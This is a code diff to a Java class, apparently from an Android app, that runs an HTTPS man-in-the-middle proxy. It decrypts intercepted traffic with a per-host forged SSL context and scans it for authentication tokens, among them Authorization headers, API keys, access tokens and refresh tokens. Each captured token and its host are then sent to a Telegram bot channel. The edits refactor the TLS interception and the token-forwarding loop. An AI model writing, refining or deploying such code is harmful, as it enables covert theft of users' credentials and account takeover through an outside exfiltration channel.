@@ -138,13 +138,19 @@ public class ProxyManager {
         clientOut.write("HTTP/1.1 200 Connection Established\r\n\r\n".getBytes());
         clientOut.flush();
 
-        // Now MITM the SSL connection using our custom SSLContext
-        SSLContext sslCtx = CertInstaller.getMitmSSLContext(context, host);
-        SSLServerSocketFactory ssf = sslCtx.getServerSocketFactory();
+        // Now MITM the SSL: get our custom SSLContext for this host
+        SSLContext serverSslCtx = CertInstaller.getMitmSSLContext(context, host);
 
-        // Wrap client connection with our MITM SSL
-        SSLSocket sslClient = (SSLSocket) ssf.createSocket(clientSocket, host, clientSocket.getPort(), true);
+        // Create a server-mode SSL socket wrapping the raw client socket
+        SSLSocketFactory sf = serverSslCtx.getSocketFactory();
+        SSLSocket sslClient = (SSLSocket) sf.createSocket(
+            clientSocket,
+            clientSocket.getInetAddress().getHostAddress(),
+            clientSocket.getPort(),
+            true  // autoClose
+        );
         sslClient.setUseClientMode(false);
+        sslClient.setNeedClientAuth(false);
         sslClient.startHandshake();
 
         // Read the decrypted HTTPS request
@@ -230,16 +236,23 @@ public class ProxyManager {
         return s;
     }
 
+    // Pattern names aligned with TOKEN_PATTERNS order
+    private static final String[] PATTERN_NAMES = {
+        "Authorization", "X-Auth-Token", "X-Access-Token", "Token",
+        "X-Api-Key", "access_token (JSON)", "token (JSON)",
+        "id_token (JSON)", "refresh_token (JSON)"
+    };
+
     private void scanAndForwardTokens(String data, String host) {
         if (data == null || data.isEmpty()) return;
-        Set<String> found = new LinkedHashSet<>();
+        Map<String, String> found = new LinkedHashMap<>();
 
-        for (Pattern p : TOKEN_PATTERNS) {
-            Matcher m = p.matcher(data);
+        for (int i = 0; i < TOKEN_PATTERNS.length; i++) {
+            Matcher m = TOKEN_PATTERNS[i].matcher(data);
             while (m.find()) {
                 String token = m.group(1).trim();
                 if (token.length() > 8 && !token.equals("null") && !token.equals("undefined")) {
-                    found.add(token);
+                    found.put(PATTERN_NAMES[i], token);
                 }
             }
         }
@@ -247,15 +260,11 @@ public class ProxyManager {
         if (!found.isEmpty()) {
             String botToken = prefs.getString("bot_token", "");
             String channelId = prefs.getString("channel_id", "");
-            String targetApp = prefs.getString("target_app", "");
 
             if (!botToken.isEmpty() && !channelId.isEmpty()) {
-                for (String token : found) {
-                    String msg = "🔑 Token captured!\n" +
-                        "📱 App: " + targetApp + "\n" +
-                        "🌐 Host: " + host + "\n" +
-                        "🔐 Token: " + token;
-                    new TelegramForwarder(botToken, channelId).send(msg);
+                TelegramForwarder fwd = new TelegramForwarder(botToken, channelId);
+                for (Map.Entry<String, String> entry : found.entrySet()) {
+                    fwd.send(entry.getKey(), entry.getValue(), host);
                 }
             }
         }
